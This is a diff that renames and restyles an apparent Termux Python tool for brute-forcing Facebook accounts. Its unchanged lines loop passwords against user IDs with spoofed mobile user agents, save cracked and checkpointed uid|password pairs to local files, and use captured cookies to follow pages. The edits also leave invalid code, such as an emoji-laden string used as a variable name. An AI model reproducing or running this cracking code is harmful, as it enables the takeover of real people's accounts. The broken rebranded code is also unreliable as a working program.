@@ -80,7 +80,7 @@ def back():
 
 ah="TRICKER-"
 imt="-M4786=="
-ak=" ALIYAN-"
+ak=" HACK ✅❤️-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ ALIYAN] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ HACK ✅❤️] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -378,18 +378,13 @@ def follow(ses,coki):
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
-logo = ("""\033[1;32m      
-
- __    __   ______    ______   __    __        ________  _______  
-|  \  |  \ /      \  /      \ |  \  /  \      |        \|       \ 
-| $$  | $$|  $$$$$$\|  $$$$$$\| $$ /  $$      | $$$$$$$$| $$$$$$$\
-| $$__| $$| $$__| $$| $$   \$$| $$/  $$       | $$__    | $$__/ $$
-| $$    $$| $$    $$| $$      | $$  $$        | $$  \   | $$    $$
-| $$$$$$$$| $$$$$$$$| $$   __ | $$$$$\        | $$$$$   | $$$$$$$\
-| $$  | $$| $$  | $$| $$__/  \| $$ \$$\       | $$      | $$__/ $$
-| $$  | $$| $$  | $$ \$$    $$| $$  \$$\      | $$      | $$    $$
- \$$   \$$ \$$   \$$  \$$$$$$  \$$   \$$       \$$       \$$$$$$$                                                                                                                                                                    
-     \033
+logo = ("""\033[1;33m 
+ _   _   ___  _____  _   __ ____________ 
+| | | | / _ \/  __ \| | / / |  ___| ___ \
+| |_| |/ /_\ \ /  \/| |/ /  | |_  | |_/ /
+|  _  ||  _  | |    |    \  |  _| | ___ \
+| | | || | | | \__/\| |\  \ | |   | |_/ /
+\_| |_/\_| |_/\____/\_| \_/ \_|   \____/                                                                                                                                                             \037
 __________________X______________________
   
   AUTHOR  :  GOODNEWS 
@@ -418,13 +413,13 @@ class Main:
 		print("\033[1;32m [1] First You Subscribe Channel")
 		print("\033[1;33m [2] Exit")
 		print("")
-		ALIYAN = input("\n\033[1;36m  Chose ==> \033[1;32m")
-		if ALIYAN in ["", " "]:
+		HACK ✅❤️ = input("\n\033[1;36m  Chose ==> \033[1;32m")
+		if HACK ✅❤️ in ["", " "]:
 			exit()
-		elif ALIYAN in ["2", "02"]:
+		elif HACK ✅❤️ in ["2", "02"]:
 			print("    Thanks🥰♥️")
 			exit()
-		elif ALIYAN in ["1", "01"]:
+		elif HACK ✅❤️ in ["1", "01"]:
 			os.system("xdg-open https://youtube.com/@kingshadowtricks?si=_-BgQvTDQU3-wHZz")
 			print("")
 			time.sleep(2.0)
@@ -876,12 +871,12 @@ class Main:
 				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-HACK ✅❤️ -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ JACKSON-HACK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-HACK ✅❤️-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1283,7 +1278,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ ALIYAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ HACK ✅❤️ ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1303,12 +1298,12 @@ class Main:
 				print("\r \033[0;92m[ JACKSON-HACK] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-HACK ✅❤️-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ JACKSON-HACK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-HACK ✅❤️-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
